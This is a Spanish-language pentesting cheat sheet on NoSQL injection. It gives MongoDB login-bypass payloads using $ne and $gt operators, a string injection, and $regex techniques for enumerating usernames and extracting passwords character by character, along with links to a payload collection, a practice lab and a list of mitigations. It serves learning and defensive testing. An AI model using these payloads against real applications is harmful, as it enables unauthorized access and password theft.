# 💉 NoSQL Injection (NoSQLi)

La inyección NoSQL afecta a aplicaciones que usan bases de datos no relacionales como **MongoDB**, **CouchDB**, **Cassandra** o **FirebaseDB**. En lugar de manipular consultas SQL, se explotan los operadores y la estructura de consultas propios de estas bases de datos.

Bases de datos afectadas más comunes: `MongoDB`, `CouchDB`, `Cassandra`, `FirebaseDB`.

---

## Authentication Bypass

### Caso base — petición normal de login (JSON)

```http
POST /user/login HTTP/1.1
Host: target.com
Content-Type: application/json

{"username":"admin","password":"12345"}
```

### Bypass con operadores de MongoDB

Si el servidor no sanitiza correctamente los operadores de consulta, se puede alterar la lógica:

```json
{"username": "admin", "password": {"$ne": "valorincorrecto"}}
```

`$ne` significa "not equal" — la condición es siempre verdadera si la contraseña real no es `valorincorrecto`. El login se completa sin conocer la contraseña real.

**Otras variantes:**
```json
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$ne": "foo"}, "password": {"$ne": "bar"}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": {"$gt": undefined}, "password": {"$gt": undefined}}
```

### Inyección clásica en MongoDB (cadena de texto)

En campos de texto plano que se concatenan a la consulta:
```
admin'||'1'=='1
```

---

## Enumeración de usuarios con expresiones regulares

MongoDB soporta `$regex`, lo que permite hacer fuerza bruta carácter a carácter:

```json
{"username": {"$regex": "^a"}, "password": {"$ne": "x"}}
```

Si la respuesta es positiva, hay un usuario cuyo nombre empieza por `a`. Se va refinando:
```json
{"username": {"$regex": "^ad"}, "password": {"$ne": "x"}}
{"username": {"$regex": "^adm"}, "password": {"$ne": "x"}}
```

Esto puede automatizarse con un script o con el intruder de Burp Suite / Caido.

Script de referencia para automatizar la enumeración:
- [https://github.com/lBENDUl/NoSQLI_Discovery](https://github.com/lBENDUl/NoSQLI_Discovery)

---

## Extracción de contraseñas con $regex

De la misma forma, se puede extraer la contraseña carácter a carácter:

```json
{"username": "admin", "password": {"$regex": "^a"}}
{"username": "admin", "password": {"$regex": "^ab"}}
```

---

## Cambiar método GET → POST para explotar parámetros

Si la aplicación usa una petición GET con parámetros de búsqueda:
```
GET /api/users?username=admin
```

Intentar convertirla a POST con `Content-Type: application/json` y añadir los operadores en el cuerpo JSON. Algunos frameworks procesan ambos formatos.

---

## Diferencias con SQL Injection

| Aspecto | SQLi | NoSQLi |
|---|---|---|
| Base de datos objetivo | Relacionales (MySQL, MSSQL, Oracle...) | No relacionales (MongoDB, Couch...) |
| Estructura explotada | Sintaxis SQL | Operadores de consulta (ej. `$ne`, `$gt`, `$regex`) |
| Payload típico | `' OR '1'='1` | `{"$ne": null}` |
| Herramienta de referencia | SQLMap | NoSQLMap, scripts personalizados |

---

## Recursos y payloads adicionales

- [PayloadsAllTheThings — NoSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)

---

## Laboratorio para practicar

- **Vulnerable-Node-App**: [https://github.com/Charlie-belmer/vulnerable-node-app](https://github.com/Charlie-belmer/vulnerable-node-app)

---

## Mitigaciones

- Validar y rechazar operadores de MongoDB en el input del usuario (filtrar `$ne`, `$gt`, `$regex`, etc.)
- Usar ORMs que parametricen las consultas automáticamente
- Deshabilitar operadores JavaScript en MongoDB (`$where`, `mapReduce`) si no son necesarios
- Principio de mínimo privilegio en la cuenta de base de datos
